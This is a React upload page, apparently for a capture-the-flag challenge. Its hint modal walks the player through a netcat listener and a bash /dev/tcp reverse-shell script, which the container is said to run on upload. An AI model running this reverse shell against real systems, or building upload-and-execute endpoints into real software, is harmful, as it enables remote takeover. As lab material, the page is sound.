"use client";

import { useState, useRef, DragEvent } from "react";

function getSize(b: number): string {
  if (b < 1024) return b + " B";
  else if (b < 1048576) return Math.round(b / 1024) + " KB";
  return (b / 1048576).toFixed(1) + " MB";
}

type Stage = "idle" | "submitting" | "success" | "error";

const initialFormState = { email: "", role: "" };

export default function UploadPage() {
  const [file, setFile]             = useState<File | null>(null);
  const [isDragging, setIsDragging] = useState(false);
  const [stage, setStage]           = useState<Stage>("idle");
  const [error, setError]           = useState("");
  const [form, setForm]             = useState(initialFormState);
  const [showHint, setShowHint]     = useState(false);
  const fileInputRef = useRef<HTMLInputElement>(null);

  function onDragOver(e: DragEvent<HTMLDivElement>) { e.preventDefault(); setIsDragging(true); }
  function onDragLeave() { setIsDragging(false); }
  function onDrop(e: DragEvent<HTMLDivElement>) {
    e.preventDefault();
    setIsDragging(false);
    const f = e.dataTransfer.files[0];
    if (f) { setFile(f); setStage("idle"); setError(""); setForm(initialFormState); }
  }

  function handleChange(e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) {
    const { name, value } = e.target;
    setForm(prev => ({ ...prev, [name]: value }));
  }

  async function handleSubmit() {
    if (stage === "submitting") return;
    if (!form.email.trim()) { setError("Email is required."); setStage("error"); return; }
    if (!form.role) { setError("Please select a role."); setStage("error"); return; }
    if (!file) { setError("Please upload a script file."); setStage("error"); return; }
    setStage("submitting");
    setError("");
    try {
      const formData = new FormData();
      formData.append("file", file);
      const res  = await fetch("/api/upload", { method: "POST", body: formData });
      const data = await res.json();
      
      setStage("success");
      setFile(null);
      setForm(initialFormState);
    } catch (err: any) {
      setError(err.message);
      setStage("error");
    }
  }

  return (
    <main className="min-h-screen w-full bg-gray-300 flex items-center justify-center px-4 py-12">

      {/* Background blobs */}
      <div className="pointer-events-none fixed inset-0 overflow-hidden -z-10">
        <div className="absolute -top-32 -left-32 w-96 h-96 bg-violet-200/30 rounded-full blur-3xl" />
        <div className="absolute -bottom-32 -right-32 w-96 h-96 bg-indigo-200/20 rounded-full blur-3xl" />
      </div>

      {/* ── Hint button top-right ── */}
      <button
        onClick={() => setShowHint(true)}
        className="absolute top-4 right-4 flex items-center gap-1.5 text-xs font-mono text-violet-500 hover:text-violet-700 border border-violet-200 hover:border-violet-400 bg-white/80 hover:bg-violet-50 px-3 py-1.5 rounded-lg transition-all"
      >
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none">
          <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="2"/>
          <path d="M12 16v-4M12 8h.01" stroke="currentColor" strokeWidth="2" strokeLinecap="round"/>
        </svg>
        View hint
      </button>

      {/* ── Hint modal ── */}
      {showHint && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm px-4"
          onClick={() => setShowHint(false)}
        >
          <div
            className="w-full max-w-md bg-zinc-900 border border-zinc-700 rounded-3xl p-6 space-y-4"
            onClick={e => e.stopPropagation()}
          >
            <div className="flex items-center justify-between">
              <p className="text-zinc-400 text-xs uppercase tracking-widest font-mono">How it works</p>
              <button onClick={() => setShowHint(false)} className="text-zinc-500 hover:text-white text-lg leading-none transition-colors">✕</button>
            </div>
            <ol className="space-y-3 font-mono text-xs">
              <li className="flex gap-3">
                <span className="text-violet-400 shrink-0">1.</span>
                <span className="text-zinc-300">Start listening on your machine:<code className="block text-green-400 mt-1">nc -lvp 6666</code></span>
              </li>
              <li className="flex gap-3">
                <span className="text-violet-400 shrink-0">2.</span>
                <span className="text-zinc-300">Create a script with your IP and port:<code className="block text-yellow-400 mt-1 break-all">bash -i &gt;&amp; /dev/tcp/YOUR_IP/6666 0&gt;&amp;1</code></span>
              </li>
              <li className="flex gap-3">
                <span className="text-violet-400 shrink-0">3.</span>
                <span className="text-zinc-300">Upload it here — container executes it and calls back to you</span>
              </li>
              <li className="flex gap-3">
                <span className="text-violet-400 shrink-0">4.</span>
                <span className="text-zinc-300">Your nc gets a shell — find the flags!</span>
              </li>
            </ol>
            <button
              onClick={() => setShowHint(false)}
              className="w-full py-2 rounded-xl border border-zinc-700 text-zinc-400 hover:text-white hover:border-zinc-500 text-xs font-mono transition-all"
            >
              Got it
            </button>
          </div>
        </div>
      )}

      <div className="w-full max-w-md space-y-4">
        <h1 className="text-3xl text-center font-bold">Enter your query here:</h1>

        {/* ── Main card ── */}
        <div className="backdrop-blur-sm border border-white/60 rounded-3xl shadow-xl shadow-violet-100/40 p-8 bg-white/80">
          <div className="max-w-md mx-auto space-y-5">

            {/* Email */}
            <div>
              <label htmlFor="email" className="block text-sm font-medium">Enter your email:</label>
              <input
                type="email"
                id="email"
                name="email"
                required
                value={form.email}
                onChange={handleChange}
                placeholder="test@example.com"
                className="mt-1 w-full h-10 px-3 border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-violet-500"
              />
            </div>

            {/* Role */}
            <div>
              <label htmlFor="role" className="block text-sm font-medium">Enter your role:</label>
              <select
                id="role"
                name="role"
                value={form.role}
                onChange={handleChange}
                required
                className="mt-1 w-full h-10 px-3 border border-gray-300 rounded-md bg-white shadow-sm focus:outline-none focus:ring-2 focus:ring-violet-500"
              >
                <option value="">-- Choose --</option>
                <option value="admin">Admin</option>
                <option value="user">User</option>
                <option value="guest">Guest</option>
              </select>
            </div>

            {/* File drop zone */}
            <div>
              <label className="block text-sm font-medium text-center mb-2">Upload your query</label>
              <div
                onDragOver={onDragOver}
                onDragLeave={onDragLeave}
                onDrop={onDrop}
                onClick={() => fileInputRef.current?.click()}
                className={`relative w-2/3 mx-auto border-2 border-dashed rounded-2xl p-8 text-center cursor-pointer transition-all duration-200 group
                  ${isDragging
                    ? "border-violet-400 bg-violet-50 scale-[1.01]"
                    : file
                    ? "border-green-300 bg-green-50/50"
                    : "border-gray-200 hover:border-violet-300 hover:bg-violet-50/50"
                  }`}
              >
                <input
                  ref={fileInputRef}
                  type="file"
                  accept=".sh,.py,.pl,.rb,text/plain,application/x-sh"
                  onChange={e => { setFile(e.target.files?.[0] ?? null); setStage("idle"); setError(""); }}
                  className="hidden"
                />
                {file ? (
                  <>
                    <p className="text-sm font-semibold text-green-700 mb-0.5">{file.name}</p>
                    <p className="text-xs text-green-600">{getSize(file.size)}</p>
                    <button
                      onClick={e => { e.stopPropagation(); setFile(null); setStage("idle"); }}
                      className="mt-2 text-xs text-red-400 hover:text-red-600 underline"
                    >
                      Remove
                    </button>
                  </>
                ) : (
                  <>
                    <p className="text-sm font-semibold text-gray-700 mb-1">
                      {isDragging ? "Release to upload" : "Drag & drop your file"}
                    </p>
                    <p className="text-xs text-gray-400">
                      or <span className="text-violet-600 font-medium underline underline-offset-2">click to browse</span>
                    </p>
                  </>
                )}
              </div>
            </div>

            {/* ── SUBMITTING: animated progress ── */}
            {stage === "submitting" && (
              <div className="px-4 py-3 rounded-xl bg-violet-50 border border-violet-200">
                <div className="flex items-center gap-2 mb-2">
                  <svg className="animate-spin w-4 h-4 text-violet-500 shrink-0" viewBox="0 0 24 24" fill="none">
                    <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeOpacity="0.25"/>
                    <path d="M12 2a10 10 0 0110 10" stroke="currentColor" strokeWidth="3" strokeLinecap="round"/>
                  </svg>
                  <p className="text-xs font-semibold text-violet-700">Performing analysis...</p>
                </div>
                <div className="w-full bg-violet-100 rounded-full h-1.5 overflow-hidden">
                  <div className="bg-violet-500 h-1.5 rounded-full animate-pulse w-2/3" />
                </div>
                <p className="text-[11px] text-violet-400 mt-1.5">Reading your query, please wait</p>
              </div>
            )}

            {/* ── SUCCESS ── */}
            {stage === "success" && (
              <div className="px-4 py-4 rounded-xl bg-emerald-50 border border-emerald-200 flex items-start gap-3">
                <div className="w-6 h-6 rounded-full bg-emerald-100 flex items-center justify-center shrink-0 mt-0.5">
                  <svg width="12" height="12" viewBox="0 0 16 16" fill="none">
                    <path d="M3 8l3.5 3.5 6.5-7" stroke="#059669" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  </svg>
                </div>
                <div>
                  <p className="text-sm font-semibold text-emerald-700 mb-0.5">Query submitted successfully!</p>
                  {/* <p className="text-xs text-emerald-600">Script is executing — check your nc listener for an incoming connection.</p> */}
                </div>
              </div>
            )}

            {/* ── ERROR ── */}
            {stage === "error" && (
              <div className="px-4 py-3 rounded-xl bg-red-50 border border-red-200 flex items-start gap-2">
                <span className="text-red-500 text-sm shrink-0 mt-0.5">⚠</span>
                <div>
                  <p className="text-xs font-semibold text-red-600 mb-0.5">Submission failed</p>
                  <p className="text-xs text-red-500">{error}</p>
                </div>
              </div>
            )}

            {/* ── Submit button — hidden after success ── */}
            {stage !== "success" && (
              <button
                type="button"
                onClick={handleSubmit}
                disabled={stage === "submitting"}
                className="w-full h-12 rounded-xl text-sm font-semibold tracking-wide transition-all duration-150
                  bg-violet-600 text-white hover:bg-violet-700 hover:shadow-lg hover:shadow-violet-200 active:scale-[0.98]
                  disabled:bg-gray-100 disabled:text-gray-300 disabled:cursor-not-allowed disabled:shadow-none"
              >
                {stage === "submitting" ? "Performing analysis..." : "Submit query →"}
              </button>
            )}

            {/* ── Reset — after success or error ── */}
            {(stage === "success" || stage === "error") && (
              <button
                type="button"
                onClick={() => { setStage("idle"); setFile(null); setForm(initialFormState); }}
                className="w-full py-2 rounded-xl border border-gray-200 text-gray-400 hover:text-gray-700 hover:border-gray-400 text-xs transition-all"
              >
                {stage === "success" ? "Submit another query" : "Try again"}
              </button>
            )}

          </div>
        </div>
      </div>
    </main>
  );
}